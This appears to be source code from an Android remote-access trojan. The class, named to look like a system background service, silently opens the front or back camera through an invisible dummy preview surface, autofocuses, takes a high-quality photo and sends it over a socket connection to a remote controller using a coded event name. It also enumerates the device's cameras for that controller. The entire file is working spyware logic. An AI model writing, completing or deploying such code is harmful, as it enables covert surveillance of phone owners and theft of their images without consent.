package com.android.background.services.helpers;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.Size;

import com.android.background.services.IOSocket;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.List;

public class CameraManager {

    private Context context;
    private Camera camera;

    public CameraManager(Context context) {
        this.context = context;
    }

    public void startUp(int cameraID) {
        camera = Camera.open(cameraID);
        Parameters parameters = camera.getParameters();

        // Chọn độ phân giải cao nhất >= 1280x720 (nếu có)
        List<Size> supportedSizes = parameters.getSupportedPictureSizes();
        Size bestSize = supportedSizes.get(0);
        for (Size size : supportedSizes) {
            if (size.width >= 1280 && size.height >= 720) {
                bestSize = size;
                break;
            }
        }
        parameters.setPictureSize(bestSize.width, bestSize.height);

        // Chất lượng ảnh cao
        parameters.setJpegQuality(90);

        // Lấy nét tự động nếu có hỗ trợ
        if (parameters.getSupportedFocusModes().contains(Parameters.FOCUS_MODE_AUTO)) {
            parameters.setFocusMode(Parameters.FOCUS_MODE_AUTO);
        }

        camera.setParameters(parameters);

        try {
            camera.setPreviewTexture(new SurfaceTexture(0));
            camera.startPreview();

            // Lấy nét trước khi chụp
            camera.autoFocus(new Camera.AutoFocusCallback() {
                @Override
                public void onAutoFocus(boolean success, Camera camera) {
                    camera.takePicture(null, null, new PictureCallback() {
                        @Override
                        public void onPictureTaken(byte[] data, Camera camera) {
                            releaseCamera();
                            sendPhoto(data);
                        }
                    });
                }
            });

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();

            // Nén JPEG chất lượng cao
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, bos);

            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", bos.toByteArray());
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }

    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                JSONObject jo = new JSONObject();
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    jo.put("name", "Front");
                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    jo.put("name", "Back");
                } else {
                    jo.put("name", "Other");
                }
                jo.put("id", i);
                list.put(jo);
            }

            cameras.put("list", list);
            return cameras;

        } catch (JSONException e) {
            e.printStackTrace();
        }

        return null;
    }
}
